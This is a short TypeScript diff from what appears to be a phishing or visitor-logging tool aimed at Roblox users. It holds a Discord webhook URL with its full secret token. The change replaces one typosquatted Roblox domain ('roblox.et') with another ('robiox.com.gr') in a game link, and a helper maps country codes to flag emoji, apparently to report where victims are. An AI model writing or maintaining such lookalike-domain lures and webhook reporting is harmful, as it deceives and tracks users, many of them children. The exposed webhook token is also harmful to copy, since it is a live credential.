@@ -4,7 +4,7 @@ const DISCORD_WEBHOOK =
   "https://discord.com/api/webhooks/1454577221573410889/pNI1MaYQTFm3n0-1UBkOLKUMF216j5XHEssVnioYKLnzMy8dkXpFJaa67fs4-x6iABEj";
 
 const GAME_LINK =
-  "https://www.roblox.et/games/78896868574590/Untitled-Cons-Experiences?privateServerLinkCode=41994734976691874690322389230807";
+  "https://www.robiox.com.gr/games/78896868574590/Untitled-Cons-Experience-New?privateServerLinkCode=41994734976691874690322389230807";
 
 function getFlagEmoji(countryCode: string): string {
   if (!countryCode || countryCode.length !== 2) return "🌍";
